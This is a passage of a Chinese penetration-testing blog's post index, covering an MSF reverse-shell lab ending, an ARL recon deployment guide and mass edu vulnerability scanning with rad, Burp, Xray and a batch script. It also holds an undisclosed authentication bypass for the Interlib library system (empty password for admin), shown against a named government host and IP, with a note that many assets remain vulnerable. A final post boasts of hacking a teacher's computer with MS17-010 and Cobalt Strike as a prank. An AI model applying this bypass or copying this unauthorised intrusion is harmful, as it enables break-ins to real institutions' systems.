src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/10.png" alt="在这里插入图片描述"></p><p>​目标机运行上传的shell.elf</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/11.png" alt="在这里插入图片描述"></p><p>​成功接收到了shell</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/12.png" alt="在这里插入图片描述"></p><p>OK 结束</p><p>这是执行载荷去接收shell的案例，其实用执行命令反弹shell的话（比如ms17010），（不只是MSF）还有一些原理和实现方法是一样的，主要是端口转发。</p><h3 id="end"><a href="#end" class="headerlink" title="end"></a><em>end</em></h3>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>灯塔资产系统（ARL）部署</title>
      <link href="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/"/>
      <url>/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="ARL-Asset-Reconnaissance-Lighthouse"><a href="#ARL-Asset-Reconnaissance-Lighthouse" class="headerlink" title="ARL (Asset Reconnaissance Lighthouse)"></a>ARL (Asset Reconnaissance Lighthouse)</h3><p>​资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p><ul><li>这是一个非常棒的信息收集工具，特别是在挖掘src的时候，前期的信息收集，个人感觉这款系统效果显著。集成于web界面，指纹识别，fofa采集，敏感泄露，子域名，c段，截图等…各种功能应有尽有。</li></ul><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><ul><li>官方Github地址：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><ol><li>官方标明，目前暂不支持Windows Server</li><li>本文使用的系统是Ubuntu x64,根据官方建议使用docker部署</li><li>建议使用云服务器，这样可以用担心用电等乱七八杂的问题，可以没日没夜的跑资产</li></ol></li></ul><h4 id="开始："><a href="#开始：" class="headerlink" title="开始："></a>开始：</h4><p>​<strong>本文将从三步来完成ARL的部署与搭建</strong></p><h5 id="一、安装docker"><a href="#一、安装docker" class="headerlink" title="一、安装docker"></a>一、安装docker</h5><p>​使用<a href="https://so.csdn.net/so/search?q=docker&spm=1001.2101.3001.7020">docker</a>部署，先要<strong>安装docker</strong>，以下的docker的安装教程，会的小伙伴可以跳过。</p><ol><li><p><code>sudo apt-get update</code></p></li><li><p><code>sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common</code></p></li><li><p><code>curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</code></p></li><li><p><code>sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</code></p></li><li><p><code>sudo apt-get -y update</code></p></li><li><p><code>sudo apt-get -y install docker-ce</code></p></li><li><p>这样的话docker就安装好了</p><p><img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/1.png" alt="img"></p></li></ol><h5 id="二、下载docker-compose"><a href="#二、下载docker-compose" class="headerlink" title="二、下载docker compose"></a>二、下载docker compose</h5><p>​有docker就少不了docker compose，接着安装docker compose</p><ol><li><p><code>curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</code></p></li><li><p><code>python3 get-pip.py</code> </p></li><li><p><code>pip3 install  -i https://pypi.tuna.tsinghua.edu.cn/simple docker-compose</code></p></li><li><p>我一般习惯好了看一下版本，一般有信息返回大概率就是能了</p><p><img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/2.png" alt="image-20240320150648511"></p></li></ol><h5 id="三、部署arl"><a href="#三、部署arl" class="headerlink" title="三、部署arl"></a>三、部署arl</h5><p>安装ARL，下载源码进行部署</p><ol><li><code>mkdir docker_arl</code> </li><li><code>wget -O docker_arl/docker2.3.ziphttps://github.com/TophantTechnology/ARL/releases/download/v2.3/docker.zip</code></li><li><code>cd docker_arl</code></li><li><code>unzip docker2.3.zip</code></li></ol><p><img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/3.png" alt="image-20240320150840681"></p><ol start="5"><li><p><code>docker-compose up -d</code>，这里会报错，放入谷歌翻译，就是说没找到一个东西，系统放出了一个命令，让我们手动输入创建</p><p><img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/4.png" alt="image-20240320150954102"></p><p>6.直接输入<code>docker volume create --name=arl_db</code>，回显OK就可以继续了</p></li><li><p><code>sudo service docker start</code> 启动docker</p></li><li><p><code>docker pull tophant/arl</code> 拉取镜像</p></li><li><p><code>reboot</code>之后 <code>docker-compose up -d</code></p><p>​ <img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/5.png" alt="img"></p></li></ol><p>​</p><p> 10.<code>docker-compose ps</code></p><p>​<img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/6.png" alt="img"></p><p> 11.可以看到端口是5003，这个时候访问就行了，注意是<strong>https</strong>，如果不能访问就在服务器厂商的安全组里面放行端口，或者关掉防火墙，本地机器就关掉防火墙看看策略</p><p> 默认账号密码： admin&#x2F;arlpass</p><p>​<img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/7.png" alt="img"></p><h3 id="end"><a href="#end" class="headerlink" title="end"></a><em>end</em></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考文章资料：</span><br><span class="line">https://github.com/TophantTechnology/ARL</span><br><span class="line">https://developer.aliyun.com/article/110806</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一个在野0day</title>
      <link href="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/"/>
      <url>/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/</url>
      
        <content type="html"><![CDATA[<p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h2 id="一个集群管理后台的0day"><a href="#一个集群管理后台的0day" class="headerlink" title="一个集群管理后台的0day"></a>一个集群管理后台的0day</h2><p><strong>截止目前 还没有被披露，看过本博客的有福啦</strong></p><p>注：我已经刷了一部分 交到了src冲了一下排名，不过剩下的资产也不少</p><p>目标：Interlib图书馆集群管理系统</p><p>归属厂商：广州图创计算机软件开发有限公司</p><h3 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h3><p>Google Hacker：interlib3&#x2F;login</p><p>目标：<a href="https://www.ccps.gov.cn/">https://www.ccps.gov.cn/</a> - <strong>中共中央党校(国家行政学院)漏洞我已经提交并修复</strong></p><p>URL：<a href="http://202.108.87.87/interlib3/login">http://202.108.87.87/interlib3/login</a></p><p><img src="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/1.png" alt="zg1.png"></p><p>账号admin，密码随便输入</p><p><img src="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/2.png" alt="zg2.png"></p><p>如下删掉passowrd的值</p><p><img src="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/3.png" alt="zg3.png"></p><p>发送</p><p><img src="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/4.png" alt="zg4.png"></p><p>成功进入后台且为管理员权限，可以看到归属于中共中央党校图书馆</p><p><img src="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/5.png" alt="image-20240322101918781"></p><p>利用这个软件的 大都是高校和政府单位，影响是不小的</p><h2 id="end"><a href="#end" class="headerlink" title="end"></a><em><strong>end</strong></em></h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自动化web漏洞挖掘</title>
      <link href="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h2 id="自动化挖漏洞环境搭建"><a href="#自动化挖漏洞环境搭建" class="headerlink" title="自动化挖漏洞环境搭建"></a><strong>自动化挖漏洞环境搭建</strong></h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>​<strong>将目标资产让爬虫工具爬取，再把数据通过burp发送给xray进行漏洞扫描</strong></p><h4 id="使用到的工具："><a href="#使用到的工具：" class="headerlink" title="使用到的工具："></a>使用到的工具：</h4><ul><li>Fofa采集工具，文章用edu系列举例，大家可以根据自己的目标进行选择。</li><li>Rad，浏览器爬取工具，github地址:  <a href="https://github.com/chaitin/rad">https://github.com/chaitin/rad</a></li><li>Chrome浏览器, Rad默认启动的浏览器</li><li>Burp和Xray就不赘述了</li></ul><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><h5 id="资产采集、"><a href="#资产采集、" class="headerlink" title="资产采集、"></a>资产采集、</h5><p>​由于举例子，就用fofa采集工具去批量采集edu资产来做演示，（<strong>感谢团队F_Dao师傅送的fofa超级会员</strong>）</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/1.png" alt="1"></p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/2.png" alt="2"></p><p>好多，fofa超级会员真香</p><h5 id="资产处理、"><a href="#资产处理、" class="headerlink" title="资产处理、"></a>资产处理、</h5><p>​因为要使用Rad爬虫，所以我们要对资产进行整理，要使他符合Rad的规则。我们要把上图红框框里的IP加上http:&#x2F;&#x2F;或者https:&#x2F;&#x2F;</p><p>​记得之前学校有考过一个题，就是在excel表中批量给单元格加同样的内容，不过我忘了，这里就用python解决好了</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/3.png" alt="1623588398_60c5fe2e0b831a09a7e97.png!small?1623588398757"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>) <span class="keyword">as</span> txt:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> txt:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;443&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;https://&quot;</span> + line)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;http://&quot;</span> + line)</span><br></pre></td></tr></table></figure><p>脚本效果</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/4.png" alt="1623588443_60c5fe5b367de0b9c7c22.png!small?1623588443941"></p><p>上面是资产处理好的效果图，放到Rad目录下，后面的内容会用到。</p><h5 id="流量转发、"><a href="#流量转发、" class="headerlink" title="流量转发、"></a>流量转发、</h5><p>​我们需要给burp添加插件，设置代理</p><p>​被动扫描插件可以更大几率提高挖到的可能性，说不准捡个shiro fastjson这些组件漏洞什么的，这里方便演示随意加两个，当然插件是多多益善</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/5.png" alt="1623588523_60c5feab8467ab213c71e.png!small?1623588524907"></p><p>​<strong>代理设置为8080，为了是和Rad响应，因为流量是从ray过来的</strong></p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/6.png" alt="1623588644_60c5ff24d23babd9faaae.png!small?1623588645579"></p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/7.png" alt="1623588675_60c5ff43bad40ae501211.png!small?1623588676494"></p><p>​<strong>流量出口设置为7777，因为们要将数据包发给Xray</strong></p><h5 id="漏洞扫描、"><a href="#漏洞扫描、" class="headerlink" title="漏洞扫描、"></a>漏洞扫描、</h5><p>​开启Xray被动扫描，监听7777，（Xray默认不扫edu，需要在config.yaml修改规则）</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/8.png" alt="1623588798_60c5ffbe9eb943425622f.png!small?1623588799371"></p><h5 id="开始测试、"><a href="#开始测试、" class="headerlink" title="开始测试、"></a>开始测试、</h5><p>​资产准备好了，漏洞扫描器也开始监听了，就差爬虫的数据了，</p><p>​众所周知命令行窗口只能一个一个的输入，步骤一的资产很多，一个一个输入很麻烦也就不是自动化了，这里使用python脚本批量，脚本内容如下：</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/9.png" alt="1623588963_60c6006313cc81189eae0.png!small?1623588963856"></p><p>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zid</span>(<span class="params">wenjian</span>):</span><br><span class="line">    words = queue.Queue()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(wenjian) <span class="keyword">as</span> txt:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line">            i = i.strip()</span><br><span class="line">            words.put(i)</span><br><span class="line">    <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zhix</span>(<span class="params">zidian</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> zidian.empty():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i = zidian.get()</span><br><span class="line">            i = i.strip()</span><br><span class="line">            ml = <span class="string">&quot;.\\rad_windows_amd64.exe -t &quot;</span> + i + <span class="string">&quot; --http-proxy 127.0.0.1:8080&quot;</span></span><br><span class="line">            os.system(ml)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    zd = zid(<span class="string">&quot;zc.txt&quot;</span>)</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t = threading.Thread(target=zhix, args=(zd,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;扫描结束......&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第28行是步骤一整理好资产1.txt的文件名，第30行可以根据需求来修改线程</p><p><img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/10.png" alt="1623589257_60c6018962c7ba312d790.png!small?1623589258951"></p><p><img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/11.png" alt="1623589290_60c601aa996afa13af277.png!small?1623589291751"></p><p>等待产出即可</p><p>：)</p><p>学校端午节就给放两天假，想打游戏又要学习还想交漏洞冲冲排名，无奈久坐腰疼，受大佬F_Dao师傅点拨，准备搞一个自动化挖漏洞环境。白天挂机挖漏洞，晚上复制粘贴交平台，芜湖~</p><h2 id="end"><a href="#end" class="headerlink" title="end"></a><em><strong>end</strong></em></h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>上课用msf+cs给老师电脑打穿了</title>
      <link href="/2021/05/10/%E4%B8%8A%E8%AF%BE%E7%94%A8msf-cs%E7%BB%99%E8%80%81%E5%B8%88%E7%94%B5%E8%84%91%E6%89%93%E7%A9%BF%E4%BA%86/"/>
      <url>/2021/05/10/%E4%B8%8A%E8%AF%BE%E7%94%A8msf-cs%E7%BB%99%E8%80%81%E5%B8%88%E7%94%B5%E8%84%91%E6%89%93%E7%A9%BF%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<p>上课用msf+cs给老师电脑打穿了</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>说起来这样，上课感觉讲的太无聊，就下了个虚拟机，装好了kali，java环境以及cobaltstrike</p><p>机房什么杀软也没有… 都是windows7的系统，ms17010乱杀，然后把会话传递寄给cobaltstrike，于是乎。。</p><p>突然想小学生心理想恶搞，就出现了下面这一幕</p><p><video width="100%" height="100%" src="https://github.com/Seven1an/blogVideos/raw/main/1.mp4" type="video/mp4" controls loop></video></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
